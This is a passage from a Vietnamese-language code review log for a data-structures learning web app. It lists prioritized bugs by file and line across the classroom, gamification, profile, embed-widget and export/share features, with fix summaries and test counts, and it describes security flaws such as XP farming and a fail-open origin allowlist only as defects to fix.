| CR-030 | `studentClassroomView.spec.ts:66` | Fallback mock ok:true cho URL lạ → đổi sai path vẫn xanh |
| CR-031 | `studentClassroomView.spec.ts:60-61` | Mock start trả 204 nhưng backend trả 200 kèm JSON — fixture lệch contract |
| CR-032 | `ClassroomController.cs:96,101,213` vs FE:199 | Controller trả {Message} hoa M nhưng FE đọc err.message → lỗi thật không bao giờ hiển thị |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| CR-033 | `ClassroomProgressService.cs:121-131` | LockedItems tính cả NotStarted đã unlock — số liệu sai nhãn |
| CR-034 | `Classroom.cs:31-41` + CreateClassroomHandler:36 | InviteCodeExpiresAt không nơi nào set → expired dead code, code không bao giờ hết hạn |
| CR-035 | `ClassroomGradingController.cs:12` + Service:30 | Cho phép Admin nhưng service chỉ owner → Admin luôn 403 |
| CR-036 | `ClassroomProgressController.cs:69-112` | Start/Update/Complete trả 200 Success=false khi không enroll thay vì 403 |
| CR-037 | `StudentClassroomView.vue:214-224,266-272` | Deep-link ?itemId không trackItemStart — bài mở thẳng không tính "đang học" |
| CR-038 | `StudentClassroomView.vue:82-116` | Không watch auth — đổi user giữ nguyên classroom/progress cũ |
| CR-039 | `ClassroomProgressService.cs:156-157,189-190,227-228` | FirstOrDefaultAsync không OrderByDescending(AttemptNumber) — attempt 2 ghi đè attempt 1 |
| CR-040 | `ClassroomProgressService.cs:83` | IsModuleLockedAsync N+1 cấp module |
| CR-041 | `ClassroomProgressService.cs:199` | ProgressPercent = scrollPercent không clamp (âm/>100) |
| CR-042 | `MyClassroomsView.vue:53-55` + GetStudentClassroomsQueryHandler | Badge c.role nhưng response không có field Role |
| CR-043 | `MyClassroomsView.vue:14` | Spinner border-t-indigo-500 lệch palette hổ phách (nên border-t-accent) |
| CR-044 | `MyClassroomsView.vue:76-113` | Modal join thiếu autofocus/Esc/focus trap |
| CR-045 | `ClassroomItemPlayer.vue:25` | Badge itemType tiếng Anh ("Lesson") vs sidebar Việt hóa |
| CR-046 | `ClassroomItemPlayer.vue:27,35` | XP hiển thị trùng 2 chỗ |
| CR-047 | `TeacherClassroomAnalytics.vue:4` | $router.back() — truy cập trực tiếp không history → vô tác dụng |
| CR-048 | `TeacherClassroomAnalytics.vue:40` | completionRate *100 thiếu guard → "NaN%" khi API thiếu field |
| CR-049 | `MyClassroomsView.vue:9 vs 53-55` | Header "tham gia với tư cách học viên" nhưng badge "Giảng viên" mâu thuẫn |
| CR-050 | `StudentClassroomView.vue:14-22` | FAB hiện khi curriculum rỗng + thiếu aria-expanded/controls |
| CR-051 | `StudentCurriculumSidebar.vue:154` | Item khóa chỉ "Đã khóa" không giải thích lý do (mở theo lịch/prerequisite) |

---

## 🔬 REVIEW ROUND 17 — 2026-08-11: Gamification (3 sub-agent, 46 lỗi ghi nhận)

**Scope:** frontend `features/gamification-engine/**` (GamificationEngine, StreakCalculator, CanvasConfettiEngine, useGamificationStore, BadgesCabinet, WeeklyLeaderboard, StreakFire, CanvasConfettiOverlay, GamificationWorkspace) + `services/gamificationApi.ts`/`leaderboardApi.ts` + `useConfetti.ts` · backend `GamificationController/StatelessGamificationController/BadgesController/LeaderboardController` + `GamificationStrategy/LeaderboardService/LeaderboardHub` + `UsersController` (xp).
**Phương pháp:** 3 góc nhìn (Logic+Backend / UI-UX / Test-Integration) — đã khử trùng lặp, ID GM-001→046 (P0=3, P1=9, P2=22, P3=12). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Backend / Frontend / Tests). Kết quả: backend **708/708 PASS** (+43), frontend **3269/3269 PASS** (181 files, +48), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 17.

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| GM-001 | `UsersController.cs:98-127` | **XP farm vô hạn**: `/users/me/xp` clamp 1-50 + allowlist nhưng KHÔNG daily cap/rate limit/idempotency (LM-006 chỉ áp dụng StatelessAuthController) — curl +50 XP/call vô hạn | Copy XpAwardDailyCap + [EnableRateLimiting] + Idempotency-Key |
| GM-002 | `gamificationApi.ts:33,36` + `leaderboardApi.ts:13` | **URL sai → 404 im lặng**: `/users/progress` (backend `/users/me/progress`), `/users/xp` (backend `/users/me/xp`), `/leaderboard?top=` (backend `/leaderboard/top?limit=`) — toàn bộ online-sync chết | Đồng bộ endpoint + contract test |
| GM-003 | `useGamificationStore.ts:91-92` ↔ `UsersController.cs:70-91` | Map sai DTO: `currentStreak` (không `streakDays`), badges `{id,name}` (không `badgeId`) → activeStreak=undefined, unlockedBadges=[undefined] | Map field thật + fixture đúng shape |

### 🟠 P1

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| GM-004 | `UsersController.cs:117-118` | Award XP không idempotent + 2 transaction rời (AwardXPAsync rồi CheckAndAwardBadgesAsync) — retry → XP gấp đôi, badge mất nếu commit 2 lỗi |
| GM-005 | `StatelessGamificationController.cs:75-96` | award-xp không idempotent — teacher bấm 2 lần/retry → XP demo gấp đôi |
| GM-006 | `LeaderboardHub.cs:8-18` | Hub không [Authorize] → spoof/broadcast spam; **không nơi nào server gọi hub** → real-time giả + dead code |
| GM-007 | `GamificationService.cs:52-65` + DbContext:321-326 | Badge grant race check-then-act — 2 request song song → insert trùng UserBadge (thiếu unique index) |
| GM-008 | `StreakCalculator.ts:15-23` vs `User.cs:155-181` | **Streak lệch timezone**: frontend local+grace 2h, backend UtcNow.Date — user UTC âm 23:30 local → 2 hệ tăng lệch |
| GM-009 | `gamification.types.ts:57` vs `GamificationStrategy.cs:28-35` | **Badge 2 hệ id lệch hoàn toàn** (recursion-master vs first-steps...) → isUnlocked luôn false, tủ huy hiệu "tất cả khóa" dù đã đạt |
| GM-010 | `GamificationWorkspace.vue:100,133-146` | "Bảng Vinh Danh Top 10 Tuần" hiển thị **mock hardcode 10 tên giả** như dữ liệu thật + 2 bảng xếp hạng mâu thuẫn |
| GM-011 | `AlgorithmDIConfiguration.cs:29` | GamificationStrategy Singleton — profile demo DÙNG CHUNG mọi user, DB chỉ lưu nếu demo@ tồn tại (mất khi restart) |
| GM-012 | `useGamificationStore.spec.ts:167-177` | Test confetti `if (unlockedBadges.length > 0)` bao quanh assertion → badge không unlock vẫn PASS (pass giả) |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| GM-013 | `useGamificationStore.ts:76-115` | Dead code + duplicate 2 hệ gamification (legacy gamificationApi/leaderboardApi không ai gọi — trùng stateless) |
| GM-014 | `useGamificationStore.ts:141-145,163` | loadBackendProfile ép lastActiveDate = hôm nay — che ngày hoạt động thật; streak server giảm nhưng store giữ (drift) |
| GM-015 | `useGamificationStore.ts` (toàn bộ) | Store singleton không reset đổi user + race loadBackendProfile vs syncProgressFromServer |
| GM-016 | `GamificationStrategy.cs:46-62` | AwardXp không cập nhật StreakDays demo → UI streak đóng băng |
| GM-017 | `useGamificationStore.ts:112` + types:22-27 | Leaderboard "tuần" sai ngữ nghĩa (TotalXP map weeklyXP); WEEKLY_RESET_DAY không dùng; leaderboardRank chưa bao giờ gán |
| GM-018 | `StreakCalculator.ts:58-62` | Freeze dùng cho mọi gap ≥2 ngày nhưng reset về 1 khi currentStreak==1 dù còn freeze — không nhất quán |
| GM-019 | 5 chỗ backend + 2 chỗ frontend | Level table + badge template duplicate, 2 hệ id khác nhau — future drift chắc chắn |
| GM-020 | `GamificationWorkspace.vue:87` | Highlight user bằng so sánh username hardcode 'VisualizationDSA Student' |
| GM-021 | `useGamificationStore.ts:154-172` + Workspace:120-122 | Sau award không reload backendLeaderboard/backendBadges → stale đến khi remount |
| GM-022 | `CanvasConfettiOverlay.vue` + `useConfetti.ts` | Không tôn trọng prefers-reduced-motion |
| GM-023 | `GamificationWorkspace.vue:24-29` + store:72 | StreakFreeze cứng MAX 3 không nạp từ profile; bấm Freeze không phản hồi |
| GM-024 | `GamificationWorkspace.vue:30` | Nút "+50 XP Demo" hiện cho MỌI user nhưng endpoint chỉ Teacher/Admin → 403 |
| GM-025 | `BadgesCabinet.vue:7-25` | Thiếu tooltip/điều kiện mở khóa badge |
| GM-026 | `GamificationWorkspace.vue:58` | grid-cols-2 cố định không responsive |
| GM-027 | `GamificationWorkspace.vue:35-47` | nextBadgeXPThreshold bỏ qua streak/algorithm constraint + lệch level backend |
| GM-028 | Toàn bộ workspace | A11y thiếu aria-live/role=status cho XP/badge/streak + font 9-10px |
| GM-029 | `useGamificationStore.ts:86-95` | syncProgressFromServer không set lastActiveDate → earnXPLocal kế tiếp reset streak server về 1 |
| GM-030 | (thiếu) | CanvasConfettiOverlay 0 component test (visible→burst/destroy/cleanup) |
| GM-031 | (thiếu) | 3 API client (gamificationApi, leaderboardApi, statelessGamificationApi) 0 contract spec |
| GM-032 | (thiếu) | Backend actions 0 test (loadBackendProfile/awardXpViaBackend 403/race đổi user) |
| GM-033 | `CanvasConfettiEngine.spec.ts:30-33` | Mock rAF không invoke callback → loop end-to-end chưa chạy; duplicate test chỉ verify cửa sổ trước tick đầu |
| GM-034 | (thiếu) | Freeze store-level chưa test (gap ≥2 ngày + streakFreezesCount>0 → giữ streak + giảm freeze) |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| GM-035 | `CanvasConfettiOverlay.vue:22-36` + Engine:18-21 | watch không immediate (mount khi visible true không burst) + không listener window.resize |
| GM-036 | `UsersController.cs:190-196` + `BadgesController.cs:63-69` | GetCurrentUserId throw → 500 thay 401 |
| GM-037 | `GamificationWorkspace.vue:64-78` | "Huy hiệu từ Server" không empty state |
| GM-038 | `useGamificationStore.ts:15,197` | isSyncing/syncError/leaderboardRank dead |
| GM-039 | `BackendQuizWorkspace.vue:286-290` | fireQuizPass bắn lại mỗi backendResult + setTimeout 300ms không dọn khi unmount |
| GM-040 | `useGamificationStore.ts:74` | setStreakForTesting lộ production (test phụ thuộc) |
| GM-041 | `useGamificationStore.spec.ts:90-94` | Fake timers fake Date → lastActiveDate 1969; assert ≥1 không verify ngày thật |
| GM-042 | `useGamificationStore.spec.ts:6-14` | localStorage không clear → order-dependent |
| GM-043 | `GamificationEngine.spec.ts:77-89` | unlock multiple assert ≥2 thay vì danh sách chính xác |
| GM-044 | `gamification.types.ts:50,55` | RATE_LIMIT_SECONDS/WEEKLY_RESET_DAY constants chết |
| GM-045 | `GamificationServiceTests.cs:74-99` | Test badge Criteria nhưng ShouldAwardBadge bỏ qua Criteria (switch Name) — pass giả |
| GM-046 | (thiếu) | Backend thiếu spec LeaderboardService (cache/limit/tie-break), BadgesController, StatelessGamificationController, GamificationStrategy |

---

## 🔬 REVIEW ROUND 18 — 2026-08-11: User Profile (3 sub-agent, 37 lỗi ghi nhận)

**Scope:** frontend `views/profile/**` (ProfileView + 6 tabs) + `features/auth/store/useAuthStore.ts` (loadStatelessProfile) + `services/quizApi.ts` · backend `UsersController.cs`/`StatelessAuthController.cs` (UpdateProfile)/`StatelessQuizController.cs` (history)/`StatelessAuthStrategy.cs`.
**Phương pháp:** 3 góc nhìn (Logic+Backend / UI-UX / Test-Integration) — đã khử trùng lặp, ID PR-001→037 (P1=9, P2=14, P3=14). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Backend / Frontend / Tests). Kết quả: backend **720/720 PASS** (+12), frontend **3298/3298 PASS** (184 files, +29), `vue-tsc` 0 lỗi. Chi tiết fix: `plan/tracking/errors.md` Review Round 18.

### 🟠 P1

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| PR-001 | `StatelessAuthController.cs:519-557` + `StatelessAuthStrategy.cs:283-302` | **UpdateProfile chỉ sửa in-memory, KHÔNG persist DB** — đổi username/bio mất sạch sau restart/EvictIdleUsers; change-password thì persist (bất nhất) | Thêm setter User entity + đồng bộ DB |
| PR-002 | `StatelessQuizController.cs:275-311,327-334` | **Quiz bank không tạo QuizAttempt** → GetHistory chỉ đọc QuizAttempts → history tab gần như rỗng với người dùng thường | Ghi QuizAttempt cho nhánh bank quiz |
| PR-003 | `ProfileView.vue:2-3` | Modal duy nhất codebase thiếu role=dialog/aria-modal/focus trap — SR đọc như trang thường | useModalA11y |
| PR-004 | `ProfileView.vue:36-69,73-80` | Nav tabs không ARIA tablist (role/aria-selected/aria-controls/phím mũi tên) | Thêm ARIA pattern chuẩn |
| PR-005 | `ProfileGeneralTab.vue:9-27` | **Không có upload avatar** dù PB-103 (Must) + use-case đặc tả; avatar chỉ initials | Input file + POST FormData (không Content-Type) + preview + avatarUrl DTO |
| PR-006 | `profileP0Tests.spec.ts:183-187` | PF-007 test pass giả — chỉ assert panel-title; fetch stub [] → table/loading/401/500 không bao giờ test | Stub 2 attempt + assert số dòng + empty/401 riêng |
| PR-007 | (thiếu) | **ProfileView 0 test** — tab switching/đóng modal Escape/loadStatelessProfile/badge pill đều mù | profileViewP1Tests.spec.ts |
| PR-008 | `profileP0Tests.spec.ts:189` | SecurityTab chỉ test cấu trúc 3 input — logic handleChangePassword (validate/mismatch/fieldErrors/401/focus) không test | Test submit + 3 nhánh validation/401/focus |
| PR-009 | `UsersControllerTests.cs:159-167` + 2 interface FE | GetMyProgress chỉ test 401 — không positive test lastActiveDate THẬT từ DB; **userProgressApi/statelessAuthApi interface thiếu `lastActiveDate`** (contract drift GM-008) | Positive test + thêm field 2 đầu |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| PR-010 | `useAuthStore.ts:285-299` | loadStatelessProfile không đồng bộ badges/username/isPremium → ProgressTab + badge pill stale sau khi nhận badge mới |
| PR-011 | `quizApi.ts:93-107` + `ProfileHistoryTab.vue:65-78` + `services/quizApi.ts:54-55` | fetchQuizHistory không caller; HistoryTab fetch raw duplicate (any[], không timeout); services/quizApi.ts URL cũ dead — 3 bản logic lịch sử |
| PR-012 | `ProfilePreferencesTab.vue:56-76` | **Preferences dead** — 3 key `vdsa_pref_*` không nơi nào đọc; hệ thống thật dùng `dsa_preferences` | Nối read vào VCR/confetti hoặc gỡ tab |
| PR-013 | `ProfileGeneralTab.vue:106-113` | watch currentUser không trigger khi mutate in-place → form stale sau load/thiết bị khác |
| PR-014 | `ProfileHistoryTab.vue:51,65-78` | Không error state (401/5xx → "Chưa có lịch sử" giả) + không timeout |
| PR-015 | `StatelessAuthStrategy.cs:289-294` | Trùng username chỉ check in-memory (user DB chưa active vào memory không bị chặn) + không validate độ dài |
| PR-016 | `ProfileProgressTab.vue:64-68` | xpToNext không clamp Math.max(0) — "Cần thêm -10 XP" vô nghĩa |
| PR-017 | `ProfileGeneralTab.vue:131-135` | Username lỗi chỉ toast, không inline + thiếu aria-invalid |
| PR-018 | `ProfilePreferencesTab.vue:29,41` | Toggle thiếu role=switch/aria-checked |
| PR-019 | `ProfileView.vue:109-116` | Modal không autofocus/restore focus + nền vẫn cuộn (không scroll-lock) |
| PR-020 | `profileP0Tests.spec.ts:161-172` | PF-003 assert tối thiểu (chỉ username) + không error path |
| PR-021 | `profileP0Tests.spec.ts:197-204` | PF-010 không click toggle/assert localStorage |
| PR-022 | `profileP0Tests.spec.ts:56-80` | Mock chết authApi/statelessAuthApi (store mock 100%) — cover ảo |
| PR-023 | `UsersControllerTests.cs` | Thiếu 403 Student → GetUserProgress admin-only + badges shape + CompleteModule 204 |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| PR-024 | `StatelessQuizController.cs:979-997` | GetHistory trả a.Answers thô (UI không dùng) — lộ dữ liệu + payload phình |
| PR-025 | `ProfileProgressTab.vue:64-78` | Không consume gamification contract Round 17 (getUserProgress currentStreak/lastActiveDate) — lệch streak |
| PR-026 | `ProfileProgressTab.vue:62` + Strategy:311 + User.cs:134 | levelThresholds hardcode 3 nơi — lệch 1 chỗ là progress% sai |
| PR-027 | `ProfileGeneralTab.vue:140` + `useAuthStore.ts:298` | catch (err:any) + catch {} im lặng |
| PR-028 | `ProfileSecurityTab.vue:70-73` | fieldErrors.newPassword dead state |
| PR-029 | `ProfileGeneralTab.vue:72-78` | Email readonly label thiếu for/id |
| PR-030 | `ProfileView.vue:8,16` | Trộn ngôn ngữ "Settings"/"Badges & Progress" vs "HỒ SƠ CÁ NHÂN" |
| PR-031 | `ProfileProgressTab.vue:37` | badge.color + '1A' vỡ khi color 3 ký tự (#f00→#f001A) |
| PR-032 | `ProfileHistoryTab.vue:51` + css | Backend trả toàn bộ attempts không phân trang + bảng kẹt mobile |
| PR-033 | `ProfileGeneralTab.vue:80-85` | Nút "Lưu" luôn enabled dù không đổi gì |
| PR-034 | `ProfileAboutTab.vue:11` | "v2.0.0" hardcode |
| PR-035 | `profileP0Tests.spec.ts:150-159` | PF-001 không assert prefill form từ currentUser |
| PR-036 | `ProfileProgressTab.vue:48-52` | Empty-badge state + getBadgeIconName chưa test |
| PR-037 | `profileP0Tests.spec.ts:146-148` | Không unmount sau test + ProfileAboutTab 0 test |

---

## 🔬 REVIEW ROUND 19 — 2026-08-11: Embed Widget (3 sub-agent, 33 lỗi ghi nhận)

**Scope:** `features/embed-widget/**` (EmbedCommunicationBridge, SecureOriginChecker, AutoHeightResizer, useEmbedConfiguratorStore, EmbedWidgetWorkspace, LiveWidgetPreview, EmbedConfiguratorSidebar, EmbedCodeSnippet) + `views/embed/EmbedWidgetView.vue` + SortingView/GraphView (route.query consume).
**Phương pháp:** 3 góc nhìn (Logic Engine / UI-UX / Test-Integration) — đã khử trùng lặp, ID EW-001→033 (P0=3, P1=7, P2=13, P3=10). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Engine+Store / Components+View / Tests). Kết quả: frontend **3363/3363 PASS** (186 files, +65), `vue-tsc` 0 lỗi, backend 720/720. Chi tiết fix: `plan/tracking/errors.md` Review Round 19.

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| EW-001 | `EmbedCommunicationBridge.ts:71` + `AutoHeightResizer.ts:67` | **sendMessage targetOrigin sai** — mặc định = origin chính widget (self), nhưng widget nằm trong iframe cross-origin (Moodle/Canvas) → HEIGHT_CHANGED bị browser loại bỏ → auto-height KHÔNG bao giờ hoạt động | Truyền targetOrigin = origin host hoặc '*' riêng cho HEIGHT_CHANGED |
| EW-002 | toàn bộ `engine/` (grep: chỉ test + index dùng) | **Engine dead code** — bridge/AutoHeightResizer/SecureOriginChecker không được khởi tạo ở bất kỳ .vue nào; không WIDGET_READY, không lắng nghe STEP_FORWARD/RESET; host script vô tác dụng | Wire engine vào widget wrapper trong EmbedWidgetView minimal mode |
| EW-003 | `EmbedWidgetView.vue:41-53` + SortingView/GraphView | **URL query params không được tiêu thụ** — theme/vcr/watch/interactive + algo đều bị bỏ qua (SortingView/GraphView không đọc route.query) → iframe code sinh ra vô nghĩa, configurator ↔ widget tách rời | Đọc route.query + mapping (tắt VCR/watch, áp theme, set algorithmId) |

### 🟠 P1

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| EW-004 | `LiveWidgetPreview.vue:13-58` | Preview là **mock tĩnh không iframe** — barHeights cứng, badge "i=3/j=5/min=1" hardcode; store.iframeSrcUrl dead → preview không phản ánh widget thật |
| EW-005 | `EmbedWidgetView.vue:61-72` | `?algo=a&algo=b` (array) → `.toLowerCase()` crash; `?algo=` rỗng → màn hình trắng không lỗi |
| EW-006 | `EmbedCommunicationBridge.ts:37-46` | `allowedOrigins = []` → NHẬN MỌI origin (fail-open) — ngược chính sách fail-closed; SecureOriginChecker([]) từ chối mọi origin (2 chính sách mâu thuẫn) |
| EW-007 | `EmbedCommunicationBridge.spec.ts:15-18` | Test "default allowlist" pass giả — chỉ assert listenerCount===0, không dispatch origin lạ |
| EW-008 | `AutoHeightResizer.spec.ts:95-106` + `AutoHeightResizer.ts:59-73` | RO mock không fire callback → pipeline debounce/sendMessage chưa test; stale guard so lastReported TRƯỚC debounce (resize 500→600→500 vẫn gửi 600 cũ) |
| EW-009 | `useEmbedConfiguratorStore.spec.ts:225-241` | Copy không assert payload writeText(generatedIframeCode) |
| EW-010 | (thiếu) | **0 component test** — Workspace/Preview/Snippet/Sidebar/EmbedWidgetView (isMinimalMode, isInvalidAlgo, isPremiumBlocked) |
| EW-011 | `EmbedWidgetView.vue:19` | Hint lỗi liệt kê 5 algo không tồn tại (oop/solid/di/...) + thiếu quicksort-recursion default — thông tin mâu thuẫn |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| EW-012 | `EmbedCommunicationBridge.ts:48-55` | Message shape validate nông — chỉ check source, không validate action/payload (height number, stepIndex number) |
| EW-013 | `EmbedCommunicationBridge.ts:22-29` vs `SecureOriginChecker.ts:23-26` | 2 nguồn allowlist drift; checker không normalize (trim/lowercase/port/subdomain) |
| EW-014 | `EmbedWidgetView.vue:3-23` | Không error-boundary + không WIDGET_READY handshake — host không biết khi nào gửi lệnh |
| EW-015 | `LiveWidgetPreview.vue` (toàn file) | Không loading/error state; toggle Interactive vô hiệu; 3 nút VCR mockup dead UI |
| EW-016 | `EmbedConfiguratorSidebar.vue:31-38` + `types:57` | dijkstra premium không badge cảnh báo; isPremiumBlocked untested |
| EW-017 | `EmbedCodeSnippet.vue:58-60` | Host script `document.querySelector('iframe')` — bấu nhầm iframe đầu tiên; thiếu check event.source |
| EW-018 | `EmbedConfiguratorSidebar.css:1-12` + Workspace:89-95 | Sidebar 320px cứng + layout ngang — không media query, vỡ mobile |
| EW-019 | `SecureOriginChecker.spec.ts` + bridge spec | Thiếu edge-case origin spoof: port :8443, http:// downgrade, evil-subdomain, trailing slash |
| EW-020 | `useEmbedConfiguratorStore.spec.ts:261-280` | Fake timers/stub trong thân test không afterEach cleanup → rò rỉ |
| EW-021 | `useEmbedConfiguratorStore.spec.ts:48-118` + `store:45-59` | URL contract thiếu watch/interactive assert; generatedIframeCode ↔ iframeSrcUrl duplicate logic |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| EW-022 | `EmbedCommunicationBridge.ts:14-19` | getSelfOrigin '' ngoài window → sendMessage targetOrigin='' → postMessage SyntaxError |
| EW-023 | `useEmbedConfiguratorStore.ts:109-112` | setDimensions không guard NaN/Infinity → width="NaN"px |
| EW-024 | `types/embed-widget.types.ts:44` | EMBED_BASE_URL hardcode production — dev/preview không test thật |
| EW-025 | `useEmbedConfiguratorStore.ts:81-99` | copyResetTimer không clear khi resetConfigurator |
| EW-026 | `EmbedCodeSnippet.vue:8-18` | Copy không aria-live |
| EW-027 | `EmbedCodeSnippet.vue:46-51` | copyError không auto-hide/reset khi "Đặt lại Mặc định" |
| EW-028 | `LiveWidgetPreview.vue:8-10,73-80` | Header 800×500 nhưng frame scale ≤600×400 — không chỉ báo "thu nhỏ" |
| EW-029 | `EmbedConfiguratorSidebar.vue:6-19` | Theme buttons thiếu radiogroup/fieldset |
| EW-030 | `EmbedWidgetView.vue:46` + types:49-59 | quick-sort trong VISUALIZER_MAP nhưng không trong EMBED_ALGORITHM_OPTIONS — lệch danh sách |
| EW-031 | `SecureOriginChecker.spec.ts:83-89` | Test "copy whitelist" không chứng minh copy (mutate thử) |
| EW-032 | `EmbedCommunicationBridge.spec.ts:204-235` | Thiếu replay/multi-instance/sendMessage fallback test |
| EW-033 | `embedP0Tests.spec.ts` | Trùng lặp toàn bộ case với spec chuyên dụng — chi phí bảo trì kép |

---

## 🔬 REVIEW ROUND 20 — 2026-08-11: Export & Share (3 sub-agent, 30 lỗi ghi nhận)

**Scope:** `features/export-share/**` (SVGToCanvasExporter, WorkspaceStateCompressor, useExportShareStore, ShareExportModal, QRCodeDisplay, ExportFormatSelector, ExportProgressBar, ExportShareWorkspace) + `views/export-share/ExportShareView.vue` + router (route /s/).
**Phương pháp:** 3 góc nhìn (Logic Engine / UI-UX / Test-Integration) — đã khử trùng lặp, ID EX-001→030 (P1=7, P2=14, P3=9). **✅ ĐÃ FIX 2026-08-11** (3 sub-agent: Engine+Store / Components+View+Router / Tests). Kết quả: frontend **3398/3398 PASS** (192 files, +35), `vue-tsc` 0 lỗi, backend 720/720. Chi tiết fix: `plan/tracking/errors.md` Review Round 20. Còn lại: EX-023 PARTIAL (dead types giữ do barrel index).

### 🟠 P1

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| EX-001 | `QRCodeDisplay.vue:18-36` | **QR không bao giờ được vẽ** — watch flush 'pre' chạy trước khi v-if mount canvas → qrCanvas null, không trigger vẽ lại | `{ flush: 'post' }` hoặc nextTick trong onMounted |
| EX-002 | `useExportShareStore.ts:136` + `router/routes.ts` | **Share link trỏ `/s/` — route KHÔNG tồn tại** (frontend lẫn backend) → link 404, QR quét ra trang chết; phía khôi phục state không có | Implement route /s/ + restore state |
| EX-003 | `types:34` + `QRCodeDisplay.vue:26` | MAX_COMPRESSED_STATE_LENGTH=20.000 vượt xa dung lượng QR (~2953) → toCanvas throw; **toCanvas không try/catch** → unhandled rejection im lặng | Hạ limit ≤2500 + try/catch + ẩn QR khi quá dài |
| EX-004 | `useExportShareStore.ts:86-88,137-138,147-159` | Export PNG/SVG/link fail chỉ console.error — UI im lặng; success không feedback bền (progress 100% biến mất ngay) | exportError/linkError + hiển thị + success toast |
| EX-005 | `SVGToCanvasExporter.ts:69-92` + `exportP0Tests:33-69` | **PNG export pass giả**: jsdom không fire img.onload → promise không settle, isExporting kẹt true, interval leak; drawImage/toDataURL throw trong onload → promise treo vĩnh viễn | Bọc onload try/catch reject + test mock Image fire onload |
| EX-006 | `ShareExportModal.vue:2-8` | Modal thiếu role=dialog/aria-modal/focus trap/Escape/scroll-lock/restore focus (pattern chuẩn) | useModalA11y |
| EX-007 | (thiếu) | **0 component test** (Modal/QR/FormatSelector/Workspace) + **0 roundtrip test** export→import | Spec + roundtrip qua new URL(link).searchParams |

### 🟡 P2

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| EX-008 | `SVGToCanvasExporter.ts:26-36,112-122` | Chèn toàn bộ cssRules của app (scoped + global) vào SVG export — nặng, rule khác đè style, @import/url() vỡ standalone |
| EX-009 | `SVGToCanvasExporter.ts:83` + Workspace:25 | Font JetBrains Mono không nhúng — img không nạp webfont → PNG/SVG font fallback lệch fidelity |
| EX-010 | `ExportShareWorkspace.vue:99-120` | Pipeline dùng data demo tĩnh — chưa wire workspace thật, export không phản ánh sơ đồ người dùng |
| EX-011 | `useExportShareStore.ts:117-142` + `exportP2Tests:381-396` | Overflow không xóa generatedShareLink cũ → link cũ + lỗi hiển thị cùng lúc; test ES-008 pass giả (store chưa từng có link) |
| EX-012 | `useExportShareStore.ts:98-112` | downloadSVG không isExporting/disabled → double-click 2 file; không try/catch |
| EX-013 | `store:136` + lz-string | Payload thô nhét query → URLSearchParams decode `+`→space phá payload; test "+/=" sample-specific |
| EX-014 | `useExportShareStore.ts:111` | revokeObjectURL đồng bộ sau link.click() → Firefox/Edge có thể hủy download |
| EX-015 | `QRCodeDisplay.vue:5` + `ExportProgressBar.vue:2-12` | QR canvas thiếu role=img/aria-label; progressbar thiếu role/aria-valuenow + aria-live |
| EX-016 | `ShareExportModal.css:13` | Dialog 460px cố định — vỡ mobile (<480px) |
| EX-017 | `useExportShareStore.ts:147-159` | Copy link fail im lặng — không fallback execCommand |
| EX-018 | `WorkspaceStateCompressor.spec.ts` | Thiếu roundtrip unicode (tiếng Việt/emoji) + state cận ngưỡng; corrupt test không assert consoleSpy |
| EX-019 | `useExportShareStore.spec.ts` + exportP2 | Fake timers/clipboard mock không cleanup an toàn (try/finally, restore) |
| EX-020 | `exportP0Tests.spec.ts:111-114` + `WorkspaceStateCompressor.spec.ts:139-144` | Assert có điều kiện `if (overflowError)` pass giả; consoleSpy không assert |
| EX-021 | `SVGToCanvasExporter.spec.ts` | Thiếu test gradient/clipPath/foreignObject/`<image>` load fail — thường không render qua data URI |

### 🟢 P3 (tổng hợp)

| ID | Vị trí | Mô tả |
| :--- | :--- | :--- |
| EX-022 | `SVGToCanvasExporter.ts:19-42 vs 105-126` + `:40` | Duplicate logic inject style 2 chỗ + unescape deprecated |
| EX-023 | `types:19,21-28` + index | Dead types ShareLinkPayload/ShareLinkResponse/ExportScaleFactor (UI hardcode 3x) |
| EX-024 | `QRCodeDisplay.vue:23-24` | Màu QR từ CSS var có thể rgb()/color-mix() không hợp lệ — fail lặng thinh |
| EX-025 | `useExportShareStore.ts:68-70` | Progress giả setInterval "Đóng gói quy tắc CSS..." — export thật <100ms, text sai format |
| EX-026 | `ExportFormatSelector.vue:5-14` | Format selector thiếu radiogroup/aria-checked |
| EX-027 | `SVGToCanvasExporter.spec.ts:148-166,168-185` | Image restore không try/finally + test constants tautology |
| EX-028 | `SVGToCanvasExporter.ts:105-126` | SVG tạo bằng createElement không xmlns → file export không hợp lệ standalone (chưa test) |
| EX-029 | `exportP2Tests.spec.ts:518-1339` | File chứa 2 suite không liên quan (SignalR RT-002→011, Payment PA-002→012) — nhiễu scope |
| EX-030 | `exportP0Tests.spec.ts:57,68` | Real timers await 200/500ms — chậm + nondeterministic + interval leak |

---

## 🔬 REVIEW ROUND 21 — 2026-08-11: Notifications (3 sub-agent, 29 lỗi ghi nhận)

**Scope:** frontend `features/notifications/**` (NotificationBell, useNotificationStore, notificationApi) + `features/realtime/stores/useSignalRStore.ts` (connectNotifications) · backend `NotificationsController.cs`/`NotificationService.cs`/`NotificationHub.cs`/`Notification.cs` + Program.cs (DI).
